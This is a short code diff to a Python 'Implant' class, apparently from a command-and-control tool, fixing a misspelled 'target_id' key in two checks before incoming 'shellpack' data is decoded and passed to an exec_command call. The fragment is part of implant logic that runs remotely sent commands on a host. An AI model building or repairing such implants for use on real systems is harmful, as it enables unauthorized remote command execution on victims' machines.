@@ -64,7 +64,7 @@ class Implant(Host):
         Checks shellpacks for truncated, completed, or none, and passes those on to the exec helper
         """
 
-        if shellpack['targed_id'] != self.id:
+        if shellpack['target_id'] != self.id:
             return
 
         decoded_data = shellpack['data'].decode()
@@ -86,7 +86,7 @@ class Implant(Host):
 
         print(shellpack)
 
-        if shellpack['targed_id'] != self.id:
+        if shellpack['target_id'] != self.id:
             return
 
         self.exec_command(shellpack['data'].decode())
